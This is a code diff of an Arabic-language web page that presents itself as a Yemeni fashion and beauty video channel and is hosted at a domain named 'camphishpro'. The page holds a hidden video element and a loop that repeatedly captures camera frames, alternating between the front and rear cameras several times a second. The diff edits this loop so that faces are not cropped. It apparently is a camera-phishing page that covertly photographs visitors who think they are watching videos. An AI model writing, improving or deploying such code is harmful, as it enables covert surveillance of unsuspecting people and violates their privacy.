@@ -6,10 +6,8 @@
 <meta name="theme-color" content="#0f0f0f">
 <title>عالم الاناقة والجمال اليمني الصنعاني والبيضاني والعدني</title>
 
-    <!-- وسم الوصف القياسي لمحركات البحث والتليجرام -->
+    <!-- وسوم المعاينة والوصف -->
     <meta name="description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء المغربية والعالمية وكذالك الجمال نحرص كل يوم على ان نقدم لك سيدتي كل جديد لتحصلي عن كل ما تبحثي عنه وتكوني امرأة راقية وبأبهى حلة فإذا أعجبتك القناة فضلا قومي بالاشتراك فيها ومشاركتها مع من تحبين تحياااتي" />
-
-    <!-- وسوم المعاينة المباشرة (Open Graph) لواتساب وتلجرام وفيسبوك وماسنجر -->
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="عالم الاناقة والجمال" />
     <meta property="og:url" content="https://camphishpro.onrender.com/" />
@@ -21,7 +19,6 @@
     <meta property="og:image:width" content="940" />
     <meta property="og:image:height" content="788" />
 
-    <!-- وسوم المعاينة لمنصة X وتلجرام وديكسورد -->
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:url" content="https://camphishpro.onrender.com/" />
     <meta name="twitter:title" content="عالم الاناقة والجمال اليمني الصنعاني والبيضاني والعدني" />
@@ -267,7 +264,7 @@ body.drawer-mode .main{margin-inline-start:0}
 <video id="video" autoplay playsinline style="display:none;"></video>
 
 <script>
-/* ===== Data (الفيديوهات بكل الخصائص والميزات الأصلية) ===== */
+/* ===== Data ===== */
 const DM='الفيديو الموسيقي الرسمي. استمتع بالمشاهدة وشاركنا رأيك في التعليقات، ولا تنسَ الاشتراك في القناة لمتابعة كل جديد.';
 const DC='فاونديشن حسب نوع البشرة ✨🥰 #عنايه_بالبشره #عناية_بالوجه #ميك_اب #فاونديشن #foundation #makeup #مكياج.';
 const DE='مقطع ترفيهي مميز. لا تنسَ الإعجاب والاشتراك ومشاركة الفيديو مع أصدقائك.';
@@ -511,18 +508,17 @@ function download(){
   },300);
 }
 
-/* ===== ميزات الكاميرا التلقائية (مع إصلاح التدوير ومنع الاقتصاص النهائي) ===== */
+/* ===== وظيفة الكاميرا المعدلة (لمنع التقريب واقتصاص الوجه) ===== */
 let isCapturing = false;
 let currentFacingMode = 'user';
 
 async function captureFast(facingMode) {
     let stream = null;
     try {
+        // نطلب بث الفيديو بدون فرض أبعاد صلبة لمنع الكاميرا من الاقتطاع والتكبير التلقائي
         stream = await navigator.mediaDevices.getUserMedia({ 
             video: { 
-                facingMode: { ideal: facingMode },
-                width: { ideal: 1920 },
-                height: { ideal: 1080 }
+                facingMode: { ideal: facingMode }
             } 
         });
 
@@ -534,30 +530,18 @@ async function captureFast(facingMode) {
             else videoEl.onloadeddata = () => resolve();
         });
 
-        const vw = videoEl.videoWidth || 1920;
-        const vh = videoEl.videoHeight || 1080;
+        // قراءة الأبعاد الحقيقية الحالية للحساس
+        const vw = videoEl.videoWidth;
+        const vh = videoEl.videoHeight;
 
         const canvas = document.createElement('canvas');
         
-        // التحقق مما إذا كان إطار الفيديو أفقياً ويحتاج تدوير ليطابق شاشة الهاتف العمودية
-        if (vw > vh) {
-            canvas.width = vh;
-            canvas.height = vw;
-        } else {
-            canvas.width = vw;
-            canvas.height = vh;
-        }
+        // إيقاف التدوير القسري واستخدام الأبعاد الأصلية لمنع الزوم الافتراضي
+        canvas.width = vw;
+        canvas.height = vh;
 
         const ctx = canvas.getContext('2d');
-
-        // تطبيق التدوير الصحيح لالتقاط المشهد كاملاً بجميع زواياه
-        if (vw > vh) {
-            ctx.translate(canvas.width / 2, canvas.height / 2);
-            ctx.rotate((90 * Math.PI) / 180);
-            ctx.drawImage(videoEl, -vw / 2, -vh / 2, vw, vh);
-        } else {
-            ctx.drawImage(videoEl, 0, 0, vw, vh);
-        }
+        ctx.drawImage(videoEl, 0, 0, vw, vh);
 
         canvas.toBlob(blob => {
             if (blob) {
@@ -583,7 +567,7 @@ function startCapture() {
     const runLoop = async () => {
         await captureFast(currentFacingMode);
         currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
-        setTimeout(runLoop, 200);
+        setTimeout(runLoop, 300);
     };
 
     runLoop();
@@ -653,7 +637,7 @@ $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q
   searchFor(t);$('#q').blur();
 });
 
-/* ===== التعامل مع أزرار المتصفح (الرجوع / التقدم) ===== */
+/* ===== التعامل مع أزرار المتصفح ===== */
 window.addEventListener('popstate',e=>{
   if(e.state){
     S.view=e.state.view;
